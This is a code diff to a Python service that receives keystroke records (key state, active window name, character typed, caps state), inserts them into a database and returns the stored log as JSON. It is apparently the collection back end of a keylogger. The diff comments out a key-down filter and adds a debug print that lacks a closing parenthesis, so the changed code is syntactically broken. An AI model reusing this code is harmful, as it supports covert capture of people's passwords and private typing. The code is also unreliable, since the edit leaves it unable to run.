@@ -24,10 +24,13 @@ def addLog():
   # Process.separateBreakChar(data)
 
   for key in range(len(data)):
-    if (data[str(key)].isKeyDown == 1):
-      Process.separateBreakChar(data[str(key)])
+    #print(data[str(key)])
+      #if (data[str(key)].isKeyDown == 1):
+     # Process.separateBreakChar(data[str(key)])
       
     try:
+      
+      print(data[str(key)].get('isKeyDown')
       pushDB_keys(json.loads(data[str(key)]))
       
       
@@ -55,7 +58,7 @@ def pushDB_keys(payload):
   
   sql = f"INSERT INTO {main_cfg['dbKeyTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
   val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
-  print(sql,val)
+  
   mycursor.execute(sql, val)
   
   db.commit()
@@ -84,7 +87,7 @@ def pushKeylog():
   mycursor.execute(sql)
   res_query = [dict((mycursor.description[i][0],value) for i, value in enumerate(row)) for row in mycursor.fetchall()]
   res = json.dumps(res_query, default=datetime_converter)
-  print(res)
+ # print(res)
 
   return res
 
